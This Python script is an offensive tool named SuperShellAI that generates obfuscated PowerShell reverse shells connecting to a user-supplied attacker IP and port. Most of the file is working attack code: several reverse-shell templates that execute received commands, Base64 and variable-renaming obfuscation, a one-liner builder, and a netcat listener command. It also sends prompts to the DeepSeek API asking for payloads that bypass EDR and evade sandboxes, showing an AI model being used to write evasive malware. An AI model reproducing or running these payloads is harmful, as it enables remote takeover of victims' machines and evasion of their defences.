import requests
import json
import base64
import random
import string
import argparse
import time
import os
from datetime import datetime
from typing import List, Dict, Optional

try:
    from colorama import Fore, Back, Style, init
    init(autoreset=True)
except ImportError:
    print("Installing colorama for colored output...")
    os.system("pip install colorama")
    from colorama import Fore, Back, Style, init
    init(autoreset=True)

class DeepSeekIntegration:
    def __init__(self, api_key: str):
        self.api_url = "https://api.deepseek.com/v1/chat/completions"
        self.api_key = api_key
        self.headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }

    def make_api_request(self, prompt: str, max_tokens: int = 2000) -> Optional[str]:
        """
        Make a request to the DeepSeek API with the given prompt
        """
        data = {
            "model": "deepseek-coder",
            "messages": [{"role": "user", "content": prompt}],
            "temperature": 0.8,
            "max_tokens": max_tokens
        }

        try:
            print(f"{Fore.YELLOW}Making API request to DeepSeek...{Style.RESET_ALL}")
            response = requests.post(self.api_url, headers=self.headers, json=data, timeout=150)
            response.raise_for_status()
            result = response.json()
            print(f"{Fore.GREEN}API request successful!{Style.RESET_ALL}")
            return result['choices'][0]['message']['content']
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}API Request Error: {e}{Style.RESET_ALL}")
            return None
        except KeyError as e:
            print(f"{Fore.RED}API Response Format Error: {e}{Style.RESET_ALL}")
            return None
        except json.JSONDecodeError as e:
            print(f"{Fore.RED}JSON Decode Error: {e}{Style.RESET_ALL}")
            return None

    def ai_obfuscate_payload(self, payload: str, technique: str = "advanced_evasion") -> Optional[str]:
        """
        Use DeepSeek to generate advanced obfuscation techniques
        """
        prompt = f"""
        As a cybersecurity expert specializing in EDR evasion, analyze this PowerShell payload and provide:
        1. A highly obfuscated version that bypasses modern EDR solutions
        2. Use techniques like: string splitting, encryption, environmental keying, API unhooking
        3. Ensure the payload remains functional
        4. Provide only the code without explanations
        
        Payload to obfuscate:
        {payload}
        """

        return self.make_api_request(prompt)

    def generate_polymorphic_payload(self, ip: str, port: str) -> Optional[str]:
        """
        Generate a polymorphic PowerShell reverse shell payload using AI
        """
        prompt = f"""
        Create a polymorphic PowerShell reverse shell payload that:
        1. Connects to {ip}:{port}
        2. Uses different obfuscation techniques than standard approaches
        3. Avoids static signatures
        4. Includes sandbox evasion techniques
        5. Uses environmental keying for execution
        6. Provides only the code without explanations
        """

        return self.make_api_request(prompt)

def generate_reverse_shell(ip: str, port: str, shell_type: str = "powershell") -> str:
    """
    Generate a reverse shell payload based on the specified type
    """
    if shell_type == "powershell":
        payload = f'''
$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
    elif shell_type == "nishang":
        payload = f'''
function ReverseShell {{
    param(
        [string]$IP,
        [int]$Port
    )
    try {{
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
    }} catch {{
        Start-Sleep -Seconds 60
        ReverseShell -IP $IP -Port $Port
        return
    }}
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{{0}}
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
        $sendback = (iex $data 2>&1 | Out-String)
        $sendback2 = $sendback + "PS " + (pwd).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
    }}
    $client.Close()
}}
ReverseShell -IP "{ip}" -Port {port}
'''
    else:
        # Default cmd.exe reverse shell
        payload = f'''
$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
    
    return payload

def basic_obfuscation(payload: str) -> str:
    """
    Apply basic obfuscation to the payload
    """
    # Encode the payload in Base64
    encoded_cmd = base64.b64encode(payload.encode('utf-16le')).decode()
    
    # Generate random variable names for obfuscation
    var_names = [random_string(5) for _ in range(6)]
    
    # Construct the obfuscated PowerShell script
    script = f'''
# Basic Obfuscation
${var_names[0]} = "System"
${var_names[1]} = "Net"
${var_names[2]} = "Sockets"
${var_names[3]} = "Text"
${var_names[4]} = "Management"
${var_names[5]} = "Automation"

# Load required assemblies
Add-Type -AssemblyName ${var_names[0]}.${var_names[4]}.${var_names[5]}
Add-Type -AssemblyName ${var_names[0]}.${var_names[1]}.${var_names[2]}

# Decode and execute the payload
${var_names[0]} = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("{encoded_cmd}"))
Invoke-Expression ${var_names[0]}
'''
    return script

def random_string(length: int) -> str:
    """
    Generate a random string of specified length
    """
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def ensure_payload_folder() -> str:
    """
    Ensure the Payload folder exists, create if it doesn't
    """
    folder_name = "Payload"
    
    try:
        os.makedirs(folder_name, exist_ok=True)
        print(f"{Fore.GREEN}Using payload folder: {folder_name}{Style.RESET_ALL}")
        return folder_name
    except OSError as e:
        print(f"{Fore.RED}Error creating folder: {e}{Style.RESET_ALL}")
        return "."

def save_to_file(content: str, filename: str, folder: str = "Payload") -> str:
    """
    Save content to a file in the specified folder
    Returns the full path to the saved file
    """
    # Ensure the folder exists
    os.makedirs(folder, exist_ok=True)
    
    # Create full file path
    filepath = os.path.join(folder, filename)
    
    try:
        with open(filepath, 'w') as f:
            f.write(content)
        print(f"{Fore.GREEN}Payload saved to: {filepath}{Style.RESET_ALL}")
        return filepath
    except Exception as e:
        print(f"{Fore.RED}Error saving file: {e}{Style.RESET_ALL}")
        # Fallback to current directory
        with open(filename, 'w') as f:
            f.write(content)
        print(f"{Fore.YELLOW}Payload saved to current directory as: {filename}{Style.RESET_ALL}")
        return filename

def clear_screen():
    """
    Clear the terminal screen
    """
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    """
    Display a cool banner for the tool
    """
    banner = f"""
    {Fore.CYAN}
                    ┏┓        ┏┓┓   ┓┓  ┏┓┳
                    ┗┓┓┏┏┓┏┓┏┓┗┓┣┓┏┓┃┃  ┣┫┃
                    ┗┛┗┻┣┛┗ ┛ ┗┛┛┗┗ ┗┗  ┛┗┻
                        ┛        
        PowerShell RCE Generator with AI Evasion Techniques
                Created by HantuKod | Version 1.4                                                                                                                                                                                                        
   {Style.RESET_ALL}
   """
    print(banner)

def get_user_input():
    """
    Get user input through interactive prompts
    """
    # Get IP address
    print(f"{Fore.YELLOW}Step 1: Enter listener details{Style.RESET_ALL}")
    while True:
        ip = input(f"{Fore.CYAN}Enter the listener IP address: {Style.RESET_ALL}").strip()
        if validate_ip(ip):
            break
        else:
            print(f"{Fore.RED}Invalid IP address format. Please try again.{Style.RESET_ALL}")
    
    # Get port number
    while True:
        try:
            port = int(input(f"{Fore.CYAN}Enter the listener port (1-65535): {Style.RESET_ALL}").strip())
            if 1 <= port <= 65535:
                break
            else:
                print(f"{Fore.RED}Port must be between 1 and 65535. Please try again.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Invalid port number. Please enter a numeric value.{Style.RESET_ALL}")
    
    # Get API key
    print(f"\n{Fore.YELLOW}Step 2: API Configuration{Style.RESET_ALL}")
    api_key = input(f"{Fore.CYAN}Enter your DeepSeek API key: {Style.RESET_ALL}").strip()
    
    # Get mode selection
    print(f"\n{Fore.YELLOW}Step 3: Select generation mode{Style.RESET_ALL}")
    print(f"{Fore.GREEN}1. Basic obfuscation (no API calls){Style.RESET_ALL}")
    print(f"{Fore.BLUE}2. AI-powered obfuscation{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}3. Polymorphic payload generation{Style.RESET_ALL}")
    
    while True:
        mode_choice = input(f"{Fore.CYAN}Enter your choice (1-3): {Style.RESET_ALL}").strip()
        if mode_choice == "1":
            mode = "basic"
            break
        elif mode_choice == "2":
            mode = "ai_obfuscated"
            break
        elif mode_choice == "3":
            mode = "polymorphic"
            break
        else:
            print(f"{Fore.RED}Invalid choice. Please enter 1, 2, or 3.{Style.RESET_ALL}")
    
    # Get shell type selection
    print(f"\n{Fore.YELLOW}Step 4: Select shell type{Style.RESET_ALL}")
    print(f"{Fore.GREEN}1. Standard PowerShell{Style.RESET_ALL}")
    print(f"{Fore.BLUE}2. Nishang-style PowerShell{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}3. CMD.exe{Style.RESET_ALL}")
    
    while True:
        shell_choice = input(f"{Fore.CYAN}Enter your choice (1-3): {Style.RESET_ALL}").strip()
        if shell_choice == "1":
            shell_type = "powershell"
            break
        elif shell_choice == "2":
            shell_type = "nishang"
            break
        elif shell_choice == "3":
            shell_type = "cmd"
            break
        else:
            print(f"{Fore.RED}Invalid choice. Please enter 1, 2, or 3.{Style.RESET_ALL}")
    
    # Get output filename
    print(f"\n{Fore.YELLOW}Step 5: Output configuration{Style.RESET_ALL}")
    output = input(f"{Fore.CYAN}Enter output filename (default: payload.ps1): {Style.RESET_ALL}").strip()
    if not output:
        output = "payload.ps1"
    
    return {
        "ip": ip,
        "port": port,
        "api_key": api_key,
        "mode": mode,
        "shell_type": shell_type,
        "output": output
    }

def validate_ip(ip):
    """
    Validate IP address format
    """
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            if not 0 <= int(part) <= 255:
                return False
        except ValueError:
            return False
    return True

def print_step(step_number, description):
    """
    Print a formatted step message
    """
    print(f"\n{Fore.YELLOW}Step {step_number}: {description}{Style.RESET_ALL}")

def create_simple_oneliner(ip: str, port: int) -> str:
    """
    Create a simple one-liner without function definitions
    """
    oneliner = f"""
    $client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});
    $stream=$client.GetStream();
    [byte[]]$bytes=0..65535|%{{0}};
    while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){{
        $data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
        $sendback=(iex $data 2>&1|Out-String);
        $sendback2=$sendback+'PS '+(pwd).Path+'> ';
        $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    }};
    $client.Close()
    """
    
    # Remove newlines and extra spaces
    oneliner = ' '.join(oneliner.split())
    return f'powershell -Command "{oneliner}"'

def main():
    # Display banner
    clear_screen()
    display_banner()
    
    # Ensure Payload folder exists
    print(f"{Fore.YELLOW}Setting up payload folder...{Style.RESET_ALL}")
    payload_folder = ensure_payload_folder()
    
    # Get user input
    user_input = get_user_input()
    
    # Generate basic payload
    print(f"\n{Fore.YELLOW}Generating {user_input['shell_type']} reverse shell payload for {user_input['ip']}:{user_input['port']}{Style.RESET_ALL}")
    basic_payload = generate_reverse_shell(user_input['ip'], user_input['port'], user_input['shell_type'])
    
    if user_input['mode'] == 'basic':
        print(f"{Fore.GREEN}Applying basic obfuscation...{Style.RESET_ALL}")
        final_payload = basic_obfuscation(basic_payload)
    
    else:
        # Initialize DeepSeek integration
        deepseek = DeepSeekIntegration(user_input['api_key'])
        
        if user_input['mode'] == 'ai_obfuscated':
            print(f"{Fore.BLUE}Requesting AI-powered obfuscation from DeepSeek...{Style.RESET_ALL}")
            final_payload = deepseek.ai_obfuscate_payload(basic_payload)
        
        elif user_input['mode'] == 'polymorphic':
            print(f"{Fore.MAGENTA}Requesting polymorphic payload generation from DeepSeek...{Style.RESET_ALL}")
            final_payload = deepseek.generate_polymorphic_payload(user_input['ip'], user_input['port'])
        
        # Fallback to basic obfuscation if AI fails
        if not final_payload:
            print(f"{Fore.RED}AI generation failed, falling back to basic obfuscation...{Style.RESET_ALL}")
            final_payload = basic_obfuscation(basic_payload)
    
    # Display and save the payload
    print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Generated PowerShell Payload:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}{final_payload}{Style.RESET_ALL}")
    
    # Save to file in the Payload folder
    saved_file = save_to_file(final_payload, user_input['output'])
    
    # Generate a one-liner version if it's not polymorphic
    if user_input['mode'] != 'polymorphic':
        # Create a simple one-liner without functions
        oneliner = create_simple_oneliner(user_input['ip'], user_input['port'])
        
        print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}One-liner Command:{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{oneliner}{Style.RESET_ALL}")
        
        # Save one-liner to file in the Payload folder
        oneliner_file = user_input['output'].replace(".ps1", "_oneliner.txt")
        oneliner_saved = save_to_file(oneliner, oneliner_file)
    
    # Create a metadata file with generation details in Payload folder
    metadata = f"""
SuperShellAI Payload Generation Metadata
========================================
Generated on: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Target IP: {user_input['ip']}
Target Port: {user_input['port']}
Generation Mode: {user_input['mode']}
Shell Type: {user_input['shell_type']}
Output Folder: {payload_folder}

Main Payload: {user_input['output']}
One-liner: {user_input['output'].replace('.ps1', '_oneliner.txt') if user_input['mode'] != 'polymorphic' else 'N/A'}

Listener Command: nc -lvnp {user_input['port']}
"""
    metadata_file = save_to_file(metadata, "generation_metadata.txt")
    
    print(f"\n{Fore.GREEN}Generation complete! All files saved in: {payload_folder}/{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Listener command example: nc -lvnp {user_input['port']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Check the metadata file for generation details: {payload_folder}/generation_metadata.txt{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
